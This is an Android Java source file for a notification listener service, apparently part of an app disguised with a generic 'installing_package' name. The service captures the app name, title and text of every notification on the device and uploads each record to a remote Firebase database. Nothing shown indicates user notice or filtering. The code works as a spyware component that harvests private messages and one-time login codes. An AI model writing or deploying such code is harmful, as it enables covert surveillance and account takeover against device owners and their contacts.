package com.example.installing_package;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {

    private DatabaseReference dbRef;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        dbRef = FirebaseDatabase.getInstance().getReference("notifications");
        Log.d("NotificationService", "🔔 Notification Listener بدأ");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = "";
        String text = "";

        if (sbn.getNotification().extras != null) {
            title = sbn.getNotification().extras.getString("android.title", "");
            text = sbn.getNotification().extras.getString("android.text", "");
        }

        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

        Log.d("NotificationService", "📥 إشعار من: " + packageName + " | " + title + " : " + text);

        NotificationModel notification = new NotificationModel(packageName, title, text, time);

        dbRef.push().setValue(notification);
    }

    public static class NotificationModel {
        public String packageName;
        public String title;
        public String text;
        public String timestamp;

        public NotificationModel() {}

        public NotificationModel(String packageName, String title, String text, String timestamp) {
            this.packageName = packageName;
            this.title = title;
            this.text = text;
            this.timestamp = timestamp;
        }
    }
}
